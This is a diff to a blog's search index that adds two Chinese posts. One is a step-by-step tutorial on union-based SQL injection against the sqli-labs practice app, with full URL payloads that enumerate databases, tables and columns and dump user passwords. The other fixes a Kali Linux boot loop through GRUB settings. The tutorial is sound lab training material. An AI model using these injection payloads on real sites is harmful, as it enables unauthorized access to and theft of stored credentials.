@@ -303,4 +303,68 @@ sql注入，都是基于査库、表、列语句
         <tag>树莓派kali linux</tag>
       </tags>
   </entry>
+  <entry>
+    <title>2. 网易web安全渗透  union联合查询注入</title>
+    <url>/2020/08/27/2.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%20%20union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="1-sql-union操作符"><a href="#1-sql-union操作符" class="headerlink" title="1. sql union操作符"></a>1. sql union操作符</h2><p>union操作符是用于，并合两个或者多个select语句的结果<br><strong>注意,union内部的 select语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时,每条 select语句中的列的顺序必须相同</strong><br>默认情况,union操作符选取不同的值。如果允许重复的值,请使用 union ALL.。</p>
+<h2 id="2-注入应用场景"><a href="#2-注入应用场景" class="headerlink" title="2. 注入应用场景"></a>2. 注入应用场景</h2><ol>
+<li>只有最后一个 SELECT子句允许有 ORDER BY;</li>
+<li>只有最后一个 SELECT子句允许有uMT;</li>
+<li>只要UNON连接的几个查询的字段数一样且列的数据类型转换没有问题,就可以查询出结果</li>
+<li>注入点页面有回显;</li>
+</ol>
+<h2 id="sql注入流程图-，下面就按照上面的流程进行注入"><a href="#sql注入流程图-，下面就按照上面的流程进行注入" class="headerlink" title="sql注入流程图 ，下面就按照上面的流程进行注入"></a>sql注入流程图 ，下面就按照上面的流程进行注入</h2><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730171110963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="1-ORDER-BY-判断列数"><a href="#1-ORDER-BY-判断列数" class="headerlink" title="1.ORDER BY 判断列数"></a>1.ORDER BY 判断列数</h3><p>ORDER BY 是用来排序的<br>        进行排序这个ORDER BY 关键字经常用于sql注入的时候，根据错误，判断有几个表<br>        列下面有6个表<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200523185903455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>        <strong>判断有几个表</strong><br>        ORDER BY 7就报错了，应为他只有6个表<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200523190036955.png" alt="在这里插入图片描述"><br>        ORDER BY 6就对了<br>        <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200523190259569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70"><br><strong>用sqli-labs进行测试</strong><br>输入4发现就报错了,那这样就判断出来，字段是有3个<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730173055957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="2-观察页面返回，选择可以显示数据的位置，进行下一步的注入"><a href="#2-观察页面返回，选择可以显示数据的位置，进行下一步的注入" class="headerlink" title="2. 观察页面返回，选择可以显示数据的位置，进行下一步的注入"></a>2. 观察页面返回，选择可以显示数据的位置，进行下一步的注入</h3><p>我们输入<br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union%20 select 1,2,3 --+</code><br>判断注入的位置上2和3</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730173813841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>执行的sql语句结果就是这个<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730173958524.png" alt="在这里插入图片描述"></p>
+<h3 id="3读取库的信息"><a href="#3读取库的信息" class="headerlink" title="3读取库的信息"></a>3读取库的信息</h3><p>输入的URL<code>http://192.168.0.104/Less-2/ ?id= -1 union  select 1,user(),3 --+</code></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730174451652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="4-读取数据"><a href="#4-读取数据" class="headerlink" title="4.读取数据"></a>4.读取数据</h3><h4 id="1-查看数据库名"><a href="#1-查看数据库名" class="headerlink" title="1.查看数据库名"></a>1.查看数据库名</h4><p>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select schema_name from information_schema.schemata   LIMIT 0,1),3 --+</code><br><strong>上面的URL介绍</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>
+<p>这个的意思在上一个博客查看<a href="https://blog.csdn.net/qq_41860876/article/details/106837536">1. 网易web安全渗透 手动sql注入</a></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p>用于查看行数，应为他只能显示一个，所以输出也只能一个<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730181715462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看其他下一个数据库</p>
+<p>URL<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select schema_name from information_schema.schemata   LIMIT 1,1),3 --+</code><br>结果<br>只要修改<code>LIMIT 0,1</code>改成1就可以了<br>可以看到显示出来了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730181935785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><strong>1.2读取全部的库</strong><br>上面输出一个不太好<br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code><br>用到了group_concat()函数，<br>应为有很多数据库他只能显示一个，所以用group_concat()叫所以库名都显示到一列中<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730175714834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="2-读取查表"><a href="#2-读取查表" class="headerlink" title="2.读取查表"></a>2.读取查表</h4><p>通过上面的查询找到数据库全部的数据库名<br>通过数据库名就可以查询表了</p>
+<p>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 --+</code></p>
+<p>URL介绍</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>这个的意思在上一个博客查看<a href="https://blog.csdn.net/qq_41860876/article/details/106837536">1. 网易web安全渗透 手动sql注入</a><br>用<code>group_concat()</code>叫所以库名都显示到一列中<br>结果<br>叫表给显示出来了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730184527355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="3-查询列"><a href="#3-查询列" class="headerlink" title="3.查询列"></a>3.查询列</h4><p>通过上面的查询查询出来了库和表<br>通过上面的表查询列<br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3 --+</code><br>URL介绍</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>这个的意思在上一个博客查看<a href="https://blog.csdn.net/qq_41860876/article/details/106837536">1. 网易web安全渗透 手动sql注入</a><br>用<code>group_concat()</code>叫所以库名都显示到一列中<br>结果<br>查看出来列了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730190143774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h4 id="4-读取数据-1"><a href="#4-读取数据-1" class="headerlink" title="4.读取数据"></a>4.读取数据</h4><p>通过上面的注入，知道了库，表，列<br>知道了全部就可以查询数据了<br>用这个<code>select 列名 from 库名.表名</code><br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(password) from security.users),3 --+</code><br>结果<br>通过注入叫数据给输出出来了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730191432156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>union联合查询注入</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解决显卡问题，kali启动死循环&quot; 5.921.261] nouveau 0000:01:00.0:&quot;</title>
+    <url>/2020/08/27/%E8%A7%A3%E5%86%B3%E6%98%BE%E5%8D%A1%E9%97%AE%E9%A2%98%EF%BC%8Ckali%E5%90%AF%E5%8A%A8%E6%AD%BB%E5%BE%AA%E7%8E%AF%205.921.261%5D%20nouveau%200000:01:00.0:/</url>
+    <content><![CDATA[<p>我的笔记本是winodws10和kali双系统<br>启动kali出现死循环5.921.261] nouveau 0000:01:00.0: fifo: SCHED_ERROR 06 ，就算重新装kali也是这个问题 ，根本就进不去系统,研究了多个深夜，<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511105630754.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70"></p>
+<p>我花了很长时间琢磨摸索研究是什么问题，终于叫这个问题给解决了</p>
+<h2 id="摸索过程"><a href="#摸索过程" class="headerlink" title="摸索过程"></a>摸索过程</h2><p>，win10独立显卡驱动安装不上就算是安装上了，也不能用，报43错误，官方最新驱动以前的老驱动，重做系统，win10还是这样，我估计是独立显卡坏了，</p>
+<p>，启动kali无线<strong>5.921.261] nouveau 0000:01:00.0: fifo: SCHED_ERROR 06</strong> ，是显卡驱动nouveau  ，<br>然后我在百度上找了很多资料，<br>刚开始kali是好的，然后突然就出现了这个问题，有大神说可能所引导没有安装好，从新安装kali，也是没有解决这个问题，我想可能是我的镜像有问题，我计算了他的值和官方的值一样，说明镜像是没有问题的，找了很多方法，还是没有解决，已经到了深夜了，我最后看了一篇文字，<a href="https://blog.csdn.net/yaorengjin0808/article/details/81613331">https://blog.csdn.net/yaorengjin0808/article/details/81613331</a> 用了这个方法发现可以进入系统了，应为kali2020系统GRUB内核参数有变动，下面是我研究了好长时间，</p>
+<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ol>
+<li><p>进入系统，叫你选系统的时候按e键，进入编辑模式，</p>
+</li>
+<li><p>在这里添加这串字符<code>nouveau.modeset=0;</code>，splash在前面也可以<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511105947952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   俺F10值启动发现就可以进入系统了<br>   <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511110429756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+<li><p>添加GRUB添加内核参数<br>进入<code>sudo vim /etc/default/grub</code><br>添加这个<code>splash nouveau.modeset=0</code></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511110632400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70"><br>命令<code>update-grub</code></p>
+<h2 id="解决这个问题参考了很多网上的资料，"><a href="#解决这个问题参考了很多网上的资料，" class="headerlink" title="解决这个问题参考了很多网上的资料，"></a>解决这个问题参考了很多网上的资料，</h2><h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2></li>
+</ol>
+]]></content>
+      <categories>
+        <category>解决显卡问题</category>
+      </categories>
+      <tags>
+        <tag>解决显卡问题</tag>
+      </tags>
+  </entry>
 </search>
